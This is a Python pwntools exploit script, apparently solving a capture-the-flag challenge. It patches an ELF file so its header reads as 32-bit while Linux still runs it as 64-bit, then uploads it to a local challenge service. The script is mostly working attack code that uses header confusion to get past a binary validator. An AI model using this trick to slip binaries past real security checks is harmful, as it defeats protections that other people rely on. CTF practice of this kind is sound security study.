#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *
from ctypes import *
import os
from elftools.elf.elffile import ELFFile

# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.terminal = ['tmux', 'new-window']
env = {}

if args.REAL:
    exe = 'python3'
    argv = ['wrapper.py']
else:
    exe = './launcher'
    argv = ['exp']


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# pwndbg tele command
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

class Phdr64(Structure):
    _fields_ = [
        ("p_type", c_uint32),
        ("p_flags", c_uint32),
        ("p_offset", c_uint64),
        ("p_vaddr", c_uint64),
        ("p_paddr", c_uint64),
        ("p_filesz", c_uint64),
        ("p_memsz", c_uint64),
        ("p_align", c_uint64),
    ]

class Ehdr64(Structure):
    _fields_ = [
        ("e_ident", c_ubyte * 16),     # Magic number and other info
        ("e_type", c_uint16),          # Object file type
        ("e_machine", c_uint16),       # Architecture
        ("e_version", c_uint32),       # Object file version
        ("e_entry", c_uint64),         # Entry point virtual address
        ("e_phoff", c_uint64),         # Program header table file offset
        ("e_shoff", c_uint64),         # Section header table file offset
        ("e_flags", c_uint32),         # Processor-specific flags
        ("e_ehsize", c_uint16),        # ELF header size in bytes
        ("e_phentsize", c_uint16),     # Program header table entry size
        ("e_phnum", c_uint16),         # Program header table entry count
        ("e_shentsize", c_uint16),     # Section header table entry size
        ("e_shnum", c_uint16),         # Section header table entry count
        ("e_shstrndx", c_uint16)       # Section header string table index
    ]

class Ehdr32(Structure):
    _pack_ = 1  # Ensures no padding between fields
    _fields_ = [
        ("e_ident", c_ubyte * 16),     # Magic number and other info
        ("e_type", c_uint16),          # Object file type
        ("e_machine", c_uint16),       # Architecture
        ("e_version", c_uint32),       # Object file version
        ("e_entry", c_uint32),         # Entry point virtual address
        ("e_phoff", c_uint32),         # Program header table file offset
        ("e_shoff", c_uint32),         # Section header table file offset
        ("e_flags", c_uint32),         # Processor-specific flags
        ("e_ehsize", c_uint16),        # ELF header size in bytes
        ("e_phentsize", c_uint16),     # Program header table entry size
        ("e_phnum", c_uint16),         # Program header table entry count
        ("e_shentsize", c_uint16),     # Section header table entry size
        ("e_shnum", c_uint16),         # Section header table entry count
        ("e_shstrndx", c_uint16)       # Section header string table index
    ]



'''
A memoryview in Python is a built-in type that provides a way to access the memory of other binary objects (like bytes, bytearray, or array.array) without copying. It's a means of working with and manipulating large datasets or binary data structures efficiently and effectively.
'''

def replace(dst, off, src):
    for i in range(off, off + len(src), 1):
        dst[i] = src[i - off]

assert(sizeof(Ehdr64) == 0x40)
assert(sizeof(Ehdr32) == 0x34)
assert(sizeof(Phdr64) == 0x38)

os.system("./compile.sh")

exp = bytearray(open("exp", "rb").read())

phdrs = exp[0x40:0x40+sizeof(Phdr64)*4]

replace(exp, 0x80, phdrs)

'''
exp: ELF 32-bit LSB executable, x86-64, version 1 (SYSV), corrupted program header size, no section header

e_ident[EI_CLASS] indicates 32 bit, however e_machine is AMD x86-64

=> Linux will execute this as a 64 bit binary still
'''

header_32 = Ehdr32.from_buffer(memoryview(exp))
header_32.e_ehsize = 0x34
header_32.e_phoff = 0x34
header_32.e_phnum = 1

header_64 = Ehdr64.from_buffer(memoryview(exp))
header_64.e_phoff = 0x80
header_64.e_phnum = 4

magic = b'\x7fELF\x01\x01\x01' + b'\x00'*9
exp = magic + exp[len(magic):]

# Write the modified exp back to the file
with open("exp", "wb") as f:
    f.write(exp)

os.system("cp exp /chroot")
# execve: fn ptr needs to be at 0x7ffdf9ed88fc

# open: fn ptr needs to be at 0x37331337
io = start(argv, env=env)

if args.REAL:
    io.sendlineafter("Size of your ELF:", str(len(exp)))
    io.sendlineafter("ELF File:", exp)
#gdb.attach(io, gdbscript)

io.interactive()
